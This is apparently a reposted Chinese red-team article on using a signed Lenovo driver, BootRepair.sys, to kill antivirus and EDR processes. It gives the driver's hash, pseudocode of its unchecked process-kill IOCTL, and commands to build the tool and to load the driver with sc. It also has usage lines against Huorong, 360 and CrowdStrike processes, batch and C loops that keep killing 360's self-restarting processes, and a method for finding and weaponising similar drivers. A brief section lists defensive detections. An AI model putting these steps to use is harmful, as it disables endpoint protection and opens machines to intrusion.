# BYOVD 实战：利用 Lenovo BootRepair.sys 终止 EDR 进程

> 来源：潇湘信安 - Phantom Killer
> 日期：2026-05-22
> 链接：https://mp.weixin.qq.com/s/PFkubCqJCJAN3LkjakF4AA
> 项目：https://github.com/redteamfortress/PhantomKiller

---

## 一、驱动基本信息

| 属性 | 值 |
|------|-----|
| 驱动名 | `BootRepair.sys` |
| 来源 | 联想电脑管家 |
| 数字签名 | 联想官方签名（有效） |
| SHA256 | `5ab36c116767eaae53a466fbc2dae7cfd608ed77721f65e83312037fbd57c946` |
| VirusTotal | 发布时 0/70 报毒（完全干净） |

---

## 二、逆向分析关键点

### 2.1 入口点 - DriverEntry

```
DriverEntry:
  → IoCreateDevice(\Device\BootRepair)
  → IoCreateSymbolicLink(\DosDevices\BootRepair)
  → MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTL_Handler
```

**关键发现 1：创建设备时未设置 DACL**
- `IoCreateDevice` 没加 `FILE_DEVICE_SECURE_OPEN`
- 任意低权限用户都能 `CreateFile` 打开 `\\.\BootRepair`

### 2.2 IOCTL 分发

驱动只实现了一个 IOCTL：
```
IOCTL 码：0x222014
METHOD：METHOD_BUFFERED (0x0)
FUNCTION：0x805
DEVICE_TYPE：0x22
```

### 2.3 IOCTL 0x222014 核心逻辑（伪代码还原）

```c
NTSTATUS IOCTL_Handler(PDEVICE_OBJECT dev, PIRP irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(irp);
    
    if (stack->Parameters.DeviceIoControl.IoControlCode != 0x222014)
        return STATUS_INVALID_DEVICE_REQUEST;
    
    HANDLE pid = *(HANDLE*)irp->AssociatedIrp.SystemBuffer;
    PEPROCESS target = NULL;
    
    PsLookupProcessByProcessId(pid, &target);
    ZwTerminateProcess(target, 0);       // 无任何权限检查
    ObDereferenceObject(target);
    
    return STATUS_SUCCESS;
}
```

**关键发现 2：无任何权限校验**
- 不检查调用者权限、不检查 PPL、不检查关键进程
- 直接 `ZwTerminateProcess` 杀死任意用户态进程

---

## 三、工具与用法

### 3.1 编译

```batch
:: VS 开发者命令行
cl /nologo /O2 /MT phantom_killer.c /Fe:pk.exe advapi32.lib
```

### 3.2 加载驱动（需管理员）

```batch
sc create BootRepair type=kernel binPath="C:\path\to\BootRepair.sys"
sc start BootRepair
```

### 3.3 杀进程（任意权限）

```batch
:: 通过进程名
pk.exe -n HipsDaemon.exe
pk.exe -n 360tray.exe

:: 通过 PID
pk.exe 1234
```

### 3.4 卸载驱动（需管理员）

```batch
sc stop BootRepair
sc delete BootRepair
```

---

## 四、实战测试结果

| 目标 | 进程名 | 结果 | 备注 |
|------|--------|------|------|
| 火绒安全 | `HipsDaemon.exe` | ✅ 直接杀死 | 核心守护进程，杀了火绒就瘫 |
| 火绒安全 | `HipsTray.exe` | ✅ 直接杀死 | 托盘 |
| 火绒安全 | `HipsMain.exe` | ✅ 直接杀死 | 主界面 |
| 360安全卫士 | `360tray.exe` | ✅ 直接杀死 | ⚠️ 约1分钟内自动拉起 |
| 360安全卫士 | `360sd.exe` | ✅ 直接杀死 | ⚠️ 约1分钟内自动拉起 |
| 360安全卫士 | `ZhuDongFangYu.exe` | ✅ 直接杀死 | ⚠️ 约1分钟内自动拉起 |
| CrowdStrike Falcon | `CSFalconService.exe` | ✅ 直接杀死 | 原文件作者测试 |
| 普通进程 | 任意 | ✅ 直接杀死 | 无保护机制 |

### ⚠️ 360 特例：守护进程会自动拉活

360 有独立的内核级守护（`360FsFlt.sys` 等），约 **1 分钟内** 会把被杀的进程重新拉起来。对付 360 需要用**循环 Kill**：

```batch
@echo off
:loop
pk.exe -n 360tray.exe >nul 2>&1
pk.exe -n 360sd.exe >nul 2>&1
pk.exe -n ZhuDongFangYu.exe >nul 2>&1
timeout /t 5 /nobreak >nul
goto loop
```

或者 C 版本嵌入项目中持续运行：

```c
// 循环杀 360 - 5 秒一轮
while (1) {
    DWORD pid = GetPIDByName("ZhuDongFangYu.exe");
    if (pid) KillProcessViaIOCTL(pid);
    Sleep(5000);
}
```

---

## 五、技术要点

### 5.1 为什么这个驱动是 BYOVD 完美目标？

1. **白签名** — 联想官方数字签名，VT 零检测
2. **无 DACL** — 任何用户都能打开设备
3. **功能单一但致命** — 就一个 IOCTL，功能就是杀进程
4. **无权限检查** — 不区分用户权限、不检查 PPL
5. **内核态执行** — `ZwTerminateProcess` 在内核上下文执行，用户态无法拦截

### 5.2 BYOVD 狩猎思路

```
1. 收集大量厂商驱动（联想、戴尔、华硕、技嘉...）
2. 批量逆向，筛选条件：
   a. 有数字签名且未吊销
   b. 创建了符号链接设备
   c. 未设置 DACL / FILE_DEVICE_SECURE_OPEN
   d. IOCTL 中有写内存、杀进程、加载驱动等高危操作
3. 验证 → 武器化
```

### 5.3 攻防视角

**攻击方（红队）：**
- 目前最稳定的 EDR 绕过方式之一
- 配合 DLL 劫持或驱动加载漏洞，可实现无文件落地
- 对 360 需循环 Kill 对抗守护进程
- 注意：部分 EDR 开始监控 BYOVD 行为（驱动加载事件 + DeviceIoControl 模式）

**防守方（蓝队）：**
- 监控驱动加载事件（Event ID 7045 / Sysmon Event 6）
- 检测 BYOVD 特征：非系统目录加载第三方驱动
- Windows Defender Application Control (WDAC) 阻止未授权驱动
- 微软 Vulnerable Driver Blocklist 定期更新

---

## 六、扩展阅读

- LOLDrivers: https://www.loldrivers.io/
- 微软 Vulnerable Driver Blocklist: https://aka.ms/VulnerableDriverBlocklist
- 驱动 DACL 安全：`IoCreateDeviceSecure` vs `IoCreateDevice`
- 原项目: https://github.com/redteamfortress/PhantomKiller
